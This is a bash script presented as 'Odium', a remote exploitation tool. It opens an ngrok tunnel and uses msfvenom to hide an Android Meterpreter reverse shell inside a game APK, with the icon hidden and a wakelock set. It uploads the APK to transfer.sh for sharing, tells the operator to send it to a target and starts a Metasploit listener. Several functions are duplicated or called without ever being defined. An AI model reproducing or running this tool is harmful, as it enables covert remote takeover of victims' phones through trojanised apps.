#!/bin/bash

####

# jq install

####

config_file='config/metasploit_string.rb'
settings_file=config/settings.conf
source $settings_file
# template='app/timberman.apk'
# appname="Timberman"
# local_port=4444

banner(){
   clear
   cat config/banner.txt 
}

start_ngrok(){

printf "[*] Starting ngrok...\n"
ngrok tcp $local_port > /dev/null &
while ! nc -z localhost 4040; do
  printf "[*] Waiting for ngrok url...\n"
  sleep 1.5 
done

NGROK_REMOTE_URL="$(curl -s http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url" | sed 's/"//g' )"

if test -z "${NGROK_REMOTE_URL}"
then
  printf "[!] Ngrok returned invail url (${NGROK_REMOTE_URL})\n"
  exit 1
fi

NGROK_REMOTE_HOSTNAME="$(printf $NGROK_REMOTE_URL | awk -F "//" '{print $2}' | awk -F ":" '{print $1}')"
NGROK_REMOTE_PORT="$(printf $NGROK_REMOTE_URL | awk -F ":" '{print $3}')"

printf "[*] Ngrok remote hostname '$NGROK_REMOTE_URL'\n"
# printf "[*] HOSTNAME: $NGROK_REMOTE_HOSTNAME\n"
# printf "[*] PORT: $NGROK_REMOTE_PORT\n"

}

empty_input(){
    if [ -z "$input" ];
    then
        printf "[!] Input can't be empty!";
        sleep 2;
        settings;
    fi
}

default_local_port(){
   printf "\n[i] Current default local port = $iface\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/local_port\=.*/local_port=$input/" $settings_file
    source $settings_file
    edit_set
}

default_app_name(){
   printf "\n[i] Current default app name = $iface\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/appname\=.*/appname=$input/" $settings_file
    source $settings_file
    edit_set
}

default_app_template(){
   printf "\n[i] Current default app template = $iface\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/template\=.*/template=$input/" $settings_file
    source $settings_file
    edit_set
}

default_local_port(){
   printf "\n[i] Current default exe name = $iface\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/exename\=.*/exename=$input/" $settings_file
    source $settings_file
    edit_set
}

default_local_port(){
   printf "\n[i] Current default local port = $iface\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/local_port\=.*/local_port=$input/" $settings_file
    source $settings_file
    edit_set
}

settings(){
banner
printf "Select setting to edit"
read -p "[?] Choice: " sel
case $sel in
1) default_local_port;;
2) default_app_name;;
3) default_app_template;;
4) default_exe_name;;
5) default_exe_template;;
*) menu ;;
esac
}

stop_ngrok(){

    printf "[*] Stopping ngrok in 5s...\n"
    sleep 5
    kill -9 $(ps -ef | grep 'ngrok' | grep -v 'grep' | awk '{print $2}')
    printf "[i] Done!\n"

}

start_android(){

   payload="android/meterpreter/reverse_tcp"

   banner
   printf "[*] Starting ngrok at port: $local_port...\n"
   start_ngrok
   printf "[*] Generating .apk payload...\n"
   msfvenom --platform android -p android/meterpreter/reverse_tcp -x $template AndroidHideAppIcon=true AndroidWakelock=true LHOST=$NGROK_REMOTE_HOSTNAME LPORT=$NGROK_REMOTE_PORT > $appname.apk  
   sed -i "s/PAYLOAD\ .*/PAYLOAD $payload/" $config_file > /dev/null &
   sed -i "s/LPORT\ .*/LPORT $local_port/" $config_file  > /dev/null &
   source $config_file
   printf "[*] Generating share link...\n\n"
   curl --upload-file ./$appname.apk https://transfer.sh/$appname.apk
   printf "\n\n[*] Done, send payload to target\n"
   printf "[*] Starting metasploit listener in 3s...\n" 
   sleep 3
   msfconsole -q -r $config_file
   stop_ngrok
}


# if [[ $EUID -ne 0 ]]; then
#    printf "[i] Run this script as root!!! Aborting...\n" 
#    exit 1
# fi



menu(){
banner
printf '| Odium - Remote exploitation tool |

'

printf "Select payload platform:\n
[1] Android
[2] Windows
[3] Settings
[*] Exit

"

read -p "[?] Choice: " platform
case $platform in
1)
   start_android;;
2) 
   start_windows;;
3)
   settings;;
*) 
   exit;;
esac

}

menu